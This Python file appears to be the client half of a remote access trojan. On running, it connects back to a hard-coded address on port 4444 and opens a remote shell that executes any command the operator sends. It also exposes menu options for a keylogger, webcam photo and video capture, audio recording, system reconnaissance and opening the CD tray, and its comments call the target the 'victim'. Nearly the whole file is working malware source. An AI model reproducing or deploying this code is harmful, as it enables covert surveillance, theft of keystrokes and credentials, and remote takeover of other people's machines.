import socket
import subprocess
import os
from pynput import keyboard
import logging
import ctypes
import platform


ip='192.168.2.2'
port=4444
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))


### give system info function press 3
def sys_info():
    info=platform.uname()
    s.send(b'\n\n**** victim system information ****\n\n'+str(info).encode('utf-8'))


def conn(ip,port):
    p=os.getcwd() #getting the current working directory of the victim
    
    s.send(p.encode('utf-8'))# sending it to the hacker
    
    while(1):   
        data=s.recv(1024)
        
        if(data[:2].decode('utf-8')=="cd"):
            os.chdir(data[3:].decode('utf-8'))
            p=os.getcwd()
            s.send(p.encode('utf-8'))
        
        elif(data.decode('utf-8')=='1'):
            import module_client_keylogger
            module_client_keylogger.client_keylogger()
            #s.send(b'ok')

        elif(data.decode('utf-8')=='2'):
            #os.system('eject') <- enable this if on linux
            ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None) #open cd port tray
            s.send(b'[!] opened his Cd Tray :))')
        elif(data.decode('utf-8')=='3'):
             sys_info()  #victim's system information function
        elif(data.decode('utf-8')=='4'):
             import module_webcam_screenshot_client
             module_webcam_screenshot_client.photo_capture() #enables victim's webcam and takes a screenshot	
        
        elif(data.decode('utf-8')=='5'):
        	import webcam_video_client
        	webcam_video_client.video_capture()
        elif(data.decode('utf-8')=="6"):
        	s.send('[!] type the time you want to record in seconds ex. 3 seconds'.encode('utf-8'))
        	sec=s.recv(1024)
        	
        	import audio_client
        	audio_client.audio_capture(sec.decode('utf-8'))
        else:
            
            command=subprocess.Popen(data.decode('utf-8'),shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
            output=command.stdout.read()
            s.send(str(output).encode('utf-8'))
            
conn(ip,port)
